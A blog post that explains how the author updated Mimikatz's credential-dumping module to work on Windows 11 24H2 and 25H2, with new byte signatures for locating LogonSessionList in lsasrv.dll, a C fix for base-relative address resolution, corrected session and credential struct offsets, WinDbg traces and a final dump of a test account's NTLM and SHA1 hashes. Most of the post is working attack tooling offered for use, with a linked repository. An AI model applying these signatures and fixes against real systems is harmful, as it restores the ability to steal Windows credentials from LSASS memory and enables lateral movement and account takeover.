# https://medium.com/@tanrikuluatahan/fixing-mimikatz-sekurlsa-logonpasswords-on-windows-11-24h2-25h2-253e82866197

[Sitemap](https://medium.com/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40tanrikuluatahan%2Ffixing-mimikatz-sekurlsa-logonpasswords-on-windows-11-24h2-25h2-253e82866197&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

Get app

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40tanrikuluatahan%2Ffixing-mimikatz-sekurlsa-logonpasswords-on-windows-11-24h2-25h2-253e82866197&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![Unknown user](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

# **Fixing Mimikatz sekurlsa::logonpasswords on Windows 11 24H2/25H2**

[![Tanrikuluatahan](https://miro.medium.com/v2/resize:fill:32:32/0*lSM3MXiDrJct36QE.jpg)](https://medium.com/@tanrikuluatahan?source=post_page---byline--253e82866197---------------------------------------)

[Tanrikuluatahan](https://medium.com/@tanrikuluatahan?source=post_page---byline--253e82866197---------------------------------------)

Follow

10 min read

·

Apr 10, 2026

7

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3D253e82866197&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40tanrikuluatahan%2Ffixing-mimikatz-sekurlsa-logonpasswords-on-windows-11-24h2-25h2-253e82866197&source=---header_actions--253e82866197---------------------post_audio_button------------------)

Share

> _From “Logon list” error to working NTLM extraction._

Special thanks for their work on the case [@adrvs42](https://x.com/adrvs42) and [@enessakircolak](https://x.com/enessakircolak).

You can reach me on twitter: [@0xIr0h](https://x.com/0xIr0h)

**Repo:** [https://github.com/tanrikuluatahan/mimikatz](https://github.com/tanrikuluatahan/mimikatz)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*kaMBoz-dayZycoAo-uTGvQ.png)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*J0lTdv9egkSXDLhhpLMrgQ.png)

**Target builds:** Windows 11 Pro 24H2 (build 26100.8037), also verified on 25H2 (build 26200.8037)

**Baseline:** Windows 11 22H2 (build 22621)

## TL;DR

> _Mimikatz’s_ **_sekurlsa::logonpasswords_** _fails on Windows 11 24H2 (build 26100) for three reasons, all fixable:_
>
> _1\._ **_Missing byte pattern._** _Build 26100 isn’t in Mimikatz’s signature table. Fix: add a new entry to_ **_LsaSrvReferences\[\]._**
>
> _2\._ **_From RIP-relative to base-relative addressing. (Optional)_**
>
> _In_ **_WLsaEnumerateLogonSession_** _,_ **_LogonSessionList_** _access changed from_ **_lea rcx,\[rip+disp\]_** _to_ **_lea rdx,\[r13+disp\]_** _. Mimikatz’s address resolution formula assumes RIP-relative and produces an address outside the module._
>
> **_Two Approaches_** _:_
>
> _\-_ **_Approach 1:_** _Add a post-fix that computes_ **_module\_base + displacement_** _instead of_ **_rip + displacement_** _._
>
> _\-_ **_Approach 2:_** _Use a different pattern in_ **_LsapCreateLsaLogonSession_** _where it uses RIP-relative, minimal code changes, just different bytes and offsets._
>
> _3\._ **_Struct layout changes._** _The session struct gained 16 bytes (fields from UserName onward shifted +16). The credential struct lost 4 bytes of alignment (hash fields shifted -4). Fix: new struct definitions and helper table entries._

**A note on addresses:** lsasrv.dll addresses may change with Windows cumulative update (KB patch). The WinDbg outputs and Mimikatz diagnostic traces in this post were captured across different sessions, so specific addresses may not match exactly between sections. The patterns, offsets, and methodology are the same regardless of patch level.

## 0\. Test Environment

All testing was done on Windows 11 Pro 24H2 (build 26100) running as Administrator with `SeDebugPrivilege` enabled.

**PPL (Protected Process Light)** was disabled on the test machine. Starting with Windows 8.1, Microsoft introduced RunAsPPL , a feature that makes lsass.exe run as a Protected Process Light. When PPL is active, even an administrator with `SeDebugPrivilege` cannot call `OpenProcess` on LSASS. Mimikatz would fail immediately with an access denied error before reaching any of the pattern-matching code.

We disabled PPL to isolate the variable under investigation. This research focuses on the **pattern matching and struct offset** layer, the changes Microsoft made to lsasrv.dll’s compiled code and data structures in build 26100. PPL bypass is a separate topic not covered here.

To check PPL status:

```
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
```

**Note:** On production 24H2 machines with TPM 2.0 + Secure Boot, Credential Guard may also be active. When CG is enabled, NTLM hashes are stored in an isolated VTL1 process (`LsaIso.exe`), not in LSASS memory. This is another separate protection layer not addressed in this post. On our test machine, Credential Guard was not active (`isIso = FALSE`).

## 1\. The Problem

Running the stock Mimikatz from GitHub on Windows 11 24H2:

```
mimikatz # privilege::debug
Privilege '20' OK
```

```
mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa ; Logon list
```

![](https://miro.medium.com/v2/resize:fit:620/1*FT6jkLBl3AWQq99Pyry1uw.png)

“Logon list” error

We want to use mimikatz in the newer Windows builds but we came across with a known error.

The error comes from `kuhl_m_sekurlsa.c, kuhl_m_sekurlsa_utils_search()` returned FALSE, meaning the byte pattern that locates `LogonSessionList` in lsasrv.dll was not found. Build 26100 simply isn't in Mimikatz's pattern table.

The same binary works on Windows 11 22H2 (build 22621), the issue is build-specific.

## 2\. Deriving New Signatures

Mimikatz locates global variables in lsasrv.dll by scanning for known byte sequences (signatures) near the code that accesses them. Each Windows build compiles the surrounding code slightly differently, so the byte patterns change.

Following the methodology described in [Praetorian’s “Inside Mimikatz Part 2”](https://www.praetorian.com/blog/inside-mimikatz-part2/), we disassembled lsasrv.dll from build 26100 and derived new byte patterns. We found **two viable patterns** in two different functions (other functions could be used also):

**Approach 1:** pattern in `WLsaEnumerateLogonSession` :

```
BYTE PTRN_WN11_24H2_LogonSessionList[] = {
    0x45, 0x89, 0x34, 0x24, 0x8b, 0xfb, 0x45, 0x85, 0xc0, 0x0f, 0x84, 0xaa
};
// Offsets: {34, -16}
```

**Approach 2:** pattern in `LsapCreateLsaLogonSession` (a different function that also accesses `LogonSessionList`):

```
BYTE PTRN_WN11_24H2_LogonSessionList[] = {
    0x33, 0xd2, 0x48, 0xf7, 0xf1, 0x8b, 0xda, 0x48,
    0x8d, 0x04, 0x5b, 0x48, 0xc1, 0xe0, 0x05
};
// Offsets: {58, -4}
```

We started with approach 1. After adding the pattern and offsets to `LsaSrvReferences[]`, the "Logon list" error disappeared. But `sekurlsa::logonpasswords` returned nothing, no sessions, no errors, just a blank prompt:

```
mimikatz # privilege::debug
Privilege '20' OK
```

```
mimikatz # sekurlsa::logonpasswordsmimikatz #
```

![](https://miro.medium.com/v2/resize:fit:622/1*4BrTIDFRvsVscMn7z8X2cA.png)

The pattern matched successfully. The addresses resolved without errors. But no sessions were enumerated. Something is going off…

## 3\. Debugging steps

Rather than stepping through the code in a debugger, we added diagnostic `kprintf` statements at every decision point. Each line is tagged `[DIAG x.y]` , `x` is the investigation layer, `y` is the step.

Four layers:

The first diagnostic run with approach 1 pattern `{34, -16}` (no post-fix):

```
[DIAG L1.1] lsass PID=936
[DIAG L1.1] OpenProcess => handle=0000000000000364 (err=0)
[DIAG L1.2] memory_open OK, type=1
[DIAG L1.4] initLocalLib OK
[DIAG L1.5] lsasrv.dll base=00007FF8E5C40000 size=0x1b7000
[DIAG L1.6] utils_search OK => LogonSessionList=00007FF8E5E0E7B8, Count=00007FF8E5DDA180
[DIAG L1.7] AcquireKeys => 0x00000000
```

```
[DIAG L4.1] enum: acquireLSA OK (build 26100)
[DIAG L4.2] helper: structSize=352, offLuid=0x70, offCreds=0x108
[DIAG L4.3] nbListes=1 (ListPtr=00007FF8E5E0E7B8, CountPtr=00007FF8E5DDA180)
[DIAG L4.5] FAIL: head copy at 00007FF8E5E0E7B8 (hMem type=1)
```

Everything passes, LSASS opened, lsasrv.dll found, pattern matched, keys acquired, until **L4.5 where**`ReadProcessMemory` **fails** trying to read the `LogonSessionList` head pointer.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*ID3EHCRopK-1ZmH8WptoXA.png)

```
Resolved LogonSessionList = 00007FF8E5E0E7B8
Offset from base           = 0x1CE7B80x1CE7B8 > 0x1B7000 (module size)
→ Address is 0x17DB8 bytes PAST the end of lsasrv.dll
```

The resolved address points to unmapped memory. `ReadProcessMemory` returns FALSE, the enumeration loop never executes, and Mimikatz returns blank, no error.

The pattern found the right bytes. But the formula that converts the displacement into an address produced a wrong result.

> **Note:** Approach 2 does not get this error, it parses the right addresses with the unmodifed kuhl\_m\_sekurlsa\_utils\_search() function.

## Looking at the symbols

```
0:000> x lsasrv!LogonSessionList
00000001`80199370 lsasrv!LogonSessionList = <no type information>
```

```
0:000> x lsasrv!LogonSessionListCount
00000001`8019a180 lsasrv!LogonSessionListCount = <no type information>
```

These are the real addresses. Any pattern-based resolution must arrive at these values.

## 22H2-How it used to work

```
0:000> u lsasrv!WLsaEnumerateLogonSession+0x130 L8
```

```
80082980  mov  r8d,dword ptr [lsasrv!LogonSessionListCount (8017bd08)]
80082987  mov  dword ptr [r15],r14d        ; pattern starts here
8008298a  mov  r14,rdi
8008298d  mov  esi,ebx
8008298f  test r8d,r8d
80082992  je   ...
80082998  lea  r13,[lsasrv!LogonSessionListLock (8017a450)]
8008299f  lea  rcx,[lsasrv!LogonSessionList (8017a250)]
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*OnBn-jpdRkmH7yVouQ9laQ.png)

22H2, `lea rcx,[lsasrv!LogonSessionList]`

Three variables, three `[rip+disp]` accesses. WinDbg resolves all symbol names inline because they're all RIP-relative. The `lea rcx, [rip+0x0F78AA]` instruction at `0x8008299f` gives Mimikatz the `LogonSessionList` address via the standard formula:

```
target = (address_of_displacement + 4) + displacement_value
```

This has worked for every build from Vista through 22H2.

## 24H2-What changed

```
0:000> u lsasrv!WLsaEnumerateLogonSession+0x136 L12
```

```
80035422  mov  dword ptr [r12],r14d        ; pattern starts here
80035426  mov  edi,ebx
80035428  test r8d,r8d
8003542b  je   ...
80035431  lea  r14,[lsasrv!LogonSessionListLock (80199580)]
80035438  lea  r13,[lsasrv!_tlgWriteTemplate ....(lsasrv+0x0) (00000001`80000000)]
80035441  lea  rdx,[r13+199370h]
80035448  shl  rax,4
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*LaaqDrJa15AFLwNkxWYBmw.png)

24H2, `lea r13,[lsasrv+0x0]`

The critical difference is at `0x80035441`:

```
22H2:  lea  rcx,[lsasrv!LogonSessionList (8017a250)]    WinDbg shows symbol
24H2:  lea  rdx,[r13+199370h]                           WinDbg shows NO symbol
```

On 22H2, `LogonSessionList` is loaded via `[rip+displacement]` , RIP-relative addressing. WinDbg resolves the symbol automatically.

## Get Tanrikuluatahan’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

Remember me for faster sign in

On 24H2, the compiler first loads the module base into `r13` (`lea r13,[lsasrv+0x0]`), then computes `LogonSessionList` as `r13 + 0x199370` , **base-relative addressing**. WinDbg cannot resolve the symbol because the target depends on a register value, not on the instruction pointer.

You can check it with:

```
0:000> ? 00000001`80000000+199370
Evaluate expression: 6444127088 = 00000001`80199370
```

```
0:000> ? lsasrv!LogonSessionList
Evaluate expression: 6444127088 = 00000001`80199370
```

![](https://miro.medium.com/v2/resize:fit:448/1*faLZ8uohOp-oBNgxAGChOg.png)

`module_base + 0x199370 = LogonSessionList`. The displacement `0x199370` in the `[r13+disp]` instruction IS the RVA of `LogonSessionList`.

## Why the formula breaks

Mimikatz reads the 4-byte displacement and applies:

```
target = read_addr + 4 + displacement    (RIP-relative formula)
```

For `[r13+disp]`, the displacement is an RVA (offset from module base), not an offset from RIP. The correct formula would be:

```
target = module_base + displacement      (base-relative formula)
```

The RIP-relative formula adds `read_addr + 4` (an address deep inside the .text section) instead of `module_base`. The result overshoots by roughly the offset of the code within the module, landing outside the DLL.

## 5\. Two Solutions

## Approach 1: Fix the Resolution Formula

Keep the pattern in `WLsaEnumerateLogonSession` with offsets `{34, -16}`. Add a post ecorrection in `kuhl_m_sekurlsa_utils_search` that reads the displacement and applies `module_base + displacement`:

```
BOOL kuhl_m_sekurlsa_utils_search(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib)
{
    PVOID* pLogonSessionListCount = ...;
    BOOL result = kuhl_m_sekurlsa_utils_search_generic(cLsass, pLib, LsaSrvReferences,
        ARRAYSIZE(LsaSrvReferences), (PVOID*)&LogonSessionList, pLogonSessionListCount,
        NULL, NULL);
```

```
// Post-fix for build 26100+: re-read displacement as base-relative
    if (result && cLsass->osContext.BuildNumber >= KULL_M_WIN_BUILD_11_24H2)
    {
        // search_generic resolved LogonSessionList using RIP-relative formula (wrong)
        // Re-read the displacement and compute: module_base + displacement
        PKULL_M_PATCH_GENERIC ref = kull_m_patch_getGenericFromBuild(...);
        if (ref)
        {
            // ... pattern search, read displacement ...
            LogonSessionList = (PLIST_ENTRY)(
                (PBYTE)pLib->Informations.DllBase.address + disp);
        }
    }
    return result;
}
```

After the fix:

```
[DIAG FIX] 26100 base-relative fix: disp=0x00199370, LogonSessionList=00007FF8E5DD9370
[DIAG L4.5] head copy OK, pStruct=000001F8D38D20D0
[DIAG L4.6] loop check: ... => ENTER
```

Now we have something…

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*l2CNOs7VCEEszIAO3m6nFw.png)

## Approach 2: Use a Different Pattern

Instead of fixing the formula, find a function where `LogonSessionList` is still accessed via `[rip+disp]`. The function `LsapCreateLsaLogonSession`, which inserts new sessions into the list, still uses RIP-relative addressing:

```
0:000> s -b lsasrv L?0x1b7000 33 d2 48 f7 f1 8b da 48 8d 04 5b 48 c1 e0 05
00000001`800828d9  33 d2 48 f7 f1 8b da 48-8d 04 5b 48 c1 e0 05 4c
```

```
0:000> u 00000001`800828d0 L12
800828d3  mov  ecx,dword ptr [lsasrv!LogonSessionListCount (8019a180)]
800828d9  xor  edx,edx            ; pattern starts here
800828db  div  rax,rcx
...
80082910  lea  rcx,[lsasrv!LogonSessionList (80199370)]    ; RIP-relative! Symbol shown!
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*6HEdKvNqZEAVa3e4UQ8Qzg.png)

`LsapCreateLsaLogonSession LogonSessionList`

Both `LogonSessionList` and `LogonSessionListCount` are `[rip+disp]`. The standard `search_generic` formula works without any post-fix. `utils_search` stays as the original one-liner:

```
BOOL kuhl_m_sekurlsa_utils_search(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib)
{
    PVOID* pLogonSessionListCount = ...;
    return kuhl_m_sekurlsa_utils_search_generic(cLsass, pLib, LsaSrvReferences,
        ARRAYSIZE(LsaSrvReferences), (PVOID*)&LogonSessionList,
        pLogonSessionListCount, NULL, NULL);
}
```

## Comparison

![](https://miro.medium.com/v2/resize:fit:627/1*1MoFUbHpjTApFk-x_uumRg.png)

Both produce the same result. Approach 2 is simpler for production use. Approach 1 is more educational, it demonstrates the base-relative addressing problem and its resolution.

**The lesson:** when a byte pattern breaks because the compiler changed the addressing mode, you don’t always need to fix the resolution formula. Sometimes there’s another function nearby that still uses the old mode.

## 6\. The Remaining Fixes

After resolving `LogonSessionList` correctly, sessions are found, but two more struct offset issues remain.

## 6.1 Session Struct Shifted +16 Bytes

With the list pointer fixed, sessions enumerate but fields are garbled:

```
Authentication Id : 0 ; 7644368 (00000000:0074a4d0)
Session           : UndefinedLogonType from 2
User Name         : (null)
Domain            : victim
```

![](https://miro.medium.com/v2/resize:fit:472/1*0HRQHz8pYPDZF_6h5rmoVw.png)

`UndefinedLogonType` instead of `Interactive`. `User Name` is null but `Domain` shows the username. Every field from `UserName` onward is offset by +16 bytes.

Microsoft added 16 bytes to the internal logon session struct between the LUID area and the UserName field. The existing `KIWI_MSV1_0_LIST_63` struct (size 352, used for Windows 8.1+) doesn't match build 26100.

**Fix:** Define `KIWI_MSV1_0_LIST_64` (size 368) with `PVOID unk_24h2_0, PVOID unk_24h2_1`inserted after `BYTE waza[12]` before `UserName`. Add `lsassEnumHelpers[7]` with the new field offsets and a build check in `kuhl_m_sekurlsa_enum`:

```
else if (cLsass.osContext.BuildNumber < KULL_M_WIN_BUILD_11_24H2)
    helper = &lsassEnumHelpers[6];  // KIWI_MSV1_0_LIST_63 (352 bytes)
else
    helper = &lsassEnumHelpers[7];  // KIWI_MSV1_0_LIST_64 (368 bytes)
```

## 6.2 Credential Struct Shifted -4 Bytes

After fixing the session struct, sessions display correctly but the NTLM hash has trailing zeros:

```
* NTLM     : f8895768e489bb3054af94fd00000000
                                     -------- trailing zeros
```

![](https://miro.medium.com/v2/resize:fit:558/1*oNY0xTDyFVMjKpfY0SJMUg.png)

The `MSV1_0_PRIMARY_CREDENTIAL_10_1607` struct (used for builds >= 1607) also changed in 26100. The `unkD` DWORD moved from +0x30 to +0x2C, cascading all hash field offsets by -4 bytes.

**Fix:** Add `msv1_0_primaryHelper[4]` with corrected offsets and a build check:

## Final Output

```
mimikatz # privilege::debug
Privilege '20' OK
```

```
mimikatz # sekurlsa::logonpasswordsAuthentication Id : 0 ; 285007 (00000000:0004594f)
Session           : Interactive from 1
User Name         : victim
Domain            : DESKTOP-SESQQ03
Logon Server      : DESKTOP-SESQQ03
Logon Time        : 4/9/2026 11:52:37 AM
SID               : S-1-5-21-1701276632-2543671693-4163136432-1001
        msv :
         [00000003] Primary
         * Username : victim
         * Domain   : .
         * LM       : 00000000000000000000000000000000
         * NTLM     : 89551acff8895768e489bb3054af94fd
         * SHA1     : 53b82718281a81ce064fca37118f0127112844d6
         * DPAPI    : 53b82718281a81ce064fca37118f0127
```

![](https://miro.medium.com/v2/resize:fit:571/1*dVaHZpY31k3zHBi5BALX5g.png)

The extracted NTLM hash was verified against the known password using MD4(UTF-16LE(‘password’)).

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*5vGZlLZwrx6Cjd0qNxgwCg.png)

## Tested On

- Windows 11 Pro 24H2 (build 26100.8037)
- Windows 11 Pro 25H2 (build 26200.8037)

Both approaches produce identical results on both builds.

## Future Work

- **Credential Guard:**`isIso` was FALSE on the test machine. When CG is active, credential blobs are `LSAISO_DATA_BLOB` structures encrypted with VTL1 keys, the NTLM hash is not in LSASS memory.

## References

- [Praetorian-Inside Mimikatz Part 2](https://www.praetorian.com/blog/inside-mimikatz-part2/)
- [https://github.com/skelsec/pypykatz/commit/1d9d69d87fc527a7ff75ecb0aa97eedf55649045](https://github.com/skelsec/pypykatz/commit/1d9d69d87fc527a7ff75ecb0aa97eedf55649045)

[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----253e82866197---------------------------------------)

[Red Team](https://medium.com/tag/red-team?source=post_page-----253e82866197---------------------------------------)

[Offensive Security](https://medium.com/tag/offensive-security?source=post_page-----253e82866197---------------------------------------)

[![Tanrikuluatahan](https://miro.medium.com/v2/resize:fill:48:48/0*lSM3MXiDrJct36QE.jpg)](https://medium.com/@tanrikuluatahan?source=post_page---post_author_info--253e82866197---------------------------------------)

[![Tanrikuluatahan](https://miro.medium.com/v2/resize:fill:64:64/0*lSM3MXiDrJct36QE.jpg)](https://medium.com/@tanrikuluatahan?source=post_page---post_author_info--253e82866197---------------------------------------)

Follow

[**Written by Tanrikuluatahan**](https://medium.com/@tanrikuluatahan?source=post_page---post_author_info--253e82866197---------------------------------------)

[26 followers](https://medium.com/@tanrikuluatahan/followers?source=post_page---post_author_info--253e82866197---------------------------------------)

· [3 following](https://medium.com/@tanrikuluatahan/following?source=post_page---post_author_info--253e82866197---------------------------------------)

Follow

## No responses yet

![Unknown user](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

Write a response

[What are your thoughts?](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40tanrikuluatahan%2Ffixing-mimikatz-sekurlsa-logonpasswords-on-windows-11-24h2-25h2-253e82866197&source=---post_responses--253e82866197---------------------respond_sidebar------------------)

Cancel

Respond

## More from Tanrikuluatahan

[See all from Tanrikuluatahan](https://medium.com/@tanrikuluatahan?source=post_page---author_recirc--253e82866197---------------------------------------)

## Recommended from Medium

[See more recommendations](https://medium.com/?source=post_page---read_next_recirc--253e82866197---------------------------------------)

[Help](https://help.medium.com/hc/en-us?source=post_page-----253e82866197---------------------------------------)

[Status](https://status.medium.com/?source=post_page-----253e82866197---------------------------------------)

[About](https://medium.com/about?autoplay=1&source=post_page-----253e82866197---------------------------------------)

[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----253e82866197---------------------------------------)

[Press](mailto:pressinquiries@medium.com)

[Blog](https://blog.medium.com/?source=post_page-----253e82866197---------------------------------------)

[Store](https://medium.com/store)

[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----253e82866197---------------------------------------)

[Rules](https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----253e82866197---------------------------------------)

[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----253e82866197---------------------------------------)

[Text to speech](https://speechify.com/medium?source=post_page-----253e82866197---------------------------------------)

reCAPTCHA

Recaptcha requires verification.

protected by **reCAPTCHA**